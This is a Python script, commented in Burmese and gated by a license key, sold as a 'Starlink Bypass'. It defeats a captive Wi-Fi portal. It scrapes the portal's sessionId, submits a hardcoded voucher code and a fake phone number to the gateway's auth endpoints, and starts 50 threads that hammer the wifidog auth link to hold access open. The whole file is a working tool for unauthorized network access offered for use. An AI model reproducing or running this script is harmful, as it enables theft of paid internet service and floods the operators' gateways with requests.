import requests, re, urllib3, time, threading, os, random, subprocess
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
# သင့်ရဲ့ GitHub keys.txt (Raw Link) ကို ဒီနေရာမှာ အစားထိုးပါ
GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Ruijie-Router/refs/heads/main/keys.txt"
LOCAL_KEY_FILE = ".aladdin_token"

def get_hwid():
    try:
        # ပိုမိုတိကျသော Android ID (ဂဏန်းအရှည်ကြီး) ကို ဖတ်ယူခြင်း
        hwid = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
        if not hwid or hwid == "" or hwid == "null":
            # Android ID ဖတ်မရပါက Serial Number ကို ထပ်မံကြိုးစားဖတ်ခြင်း
            hwid = subprocess.check_output('getprop ro.serialno', shell=True).decode().strip()
        return hwid if hwid else "ALADDIN-UNKNOWN-DEVICE"
    except:
        return "ALADDIN-HWID-ERROR"

def banner():
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
    db        db        .d8b.  d8888b. d8888b. d888888b d8b   db 
    88       d88       d8' `8b 88  `8D 88  `8D   `88'   888o  88 
    88      d8'88      88ooo88 88   88 88   88    88    88V8o 88 
    88     d8' `88     88~~~88 88   88 88   88    88    88 V8o88 
    88booo88'   `88    88   88 88  .8D 88  .8D   .88.   88  V888 
    Y88888P'     `88   YP   YP Y8888D' Y8888D' Y888888P VP   V8P 
    """)
    print("\033[95m" + "        🚀 Aladdin Starlink Bypass 🚀 - IMMORTAL V11")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except: return False

def license_system():
    my_id = get_hwid()
    saved_key = ""
    
    if os.path.exists(LOCAL_KEY_FILE):
        with open(LOCAL_KEY_FILE, "r") as f:
            saved_key = f.read().strip()

    banner()
    # ဒီနေရာမှာ ID အစစ် (ဂဏန်းအရှည်ကြီး) ပေါ်လာပါလိမ့်မယ်
    print(f"\033[94m[DEVICE ID]: {my_id}\033[0m")
    
    if not saved_key:
        user_key = input("\033[93m[+] Enter Access Key: \033[0m").strip()
    else:
        print("\033[92m[*] Auto Login: Checking license status...\033[0m")
        user_key = saved_key

    try:
        resp = requests.get(GITHUB_RAW_URL, timeout=10)
        key_data = resp.text.splitlines()
        
        found = False
        for line in key_data:
            if ":" in line:
                db_id, db_key, db_date = line.split(":")
                if db_id == my_id and db_key == user_key:
                    expiry = datetime.strptime(db_date, "%Y-%m-%d")
                    if datetime.now() < expiry:
                        print(f"\033[92m[✓] Access Granted! Valid until: {db_date}\033[0m")
                        with open(LOCAL_KEY_FILE, "w") as f:
                            f.write(user_key)
                        found = True
                        time.sleep(1.5)
                        break
                    else:
                        print("\033[91m[X] Key Expired! Contact Admin for renewal.\033[0m")
                        if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
                        exit()
        
        if not found:
            print("\033[91m[X] Unauthorized Device or Wrong Key!\033[0m")
            if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
            exit()

    except Exception as e:
        print(f"\033[91m[!] Connection Error! Check your internet.\033[0m")
        exit()

def high_speed_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    while True:
        try:
            requests.get(link, timeout=4, verify=False, headers=headers)
            print(f"\033[92m[✓] 🚀 Aladdin Active 🚀 | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01)
        except: break

def start_immortal():
    banner()
    print("\033[94m[*] Auto Reconnect Mode: ACTIVATED\033[0m")
    
    while True:
        if not check_net():
            print("\033[93m[!] Connection Dropped! Attempting Re-Bypass...\033[0m")
            session = requests.Session()
            try:
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                p_url = r.url
                r1 = session.get(p_url, verify=False, timeout=5)
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                n_url = urljoin(p_url, match.group(1)) if match else p_url
                r2 = session.get(n_url, verify=False, timeout=5)
                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                
                if sid:
                    print(f"\033[96m[✓] Re-connected Successfully | SID: {sid[:10]}...\033[0m")
                    p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                    session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                    
                    for _ in range(50):
                        threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
            except: pass
        
        time.sleep(5)

if __name__ == "__main__":
    license_system()
    start_immortal()
    
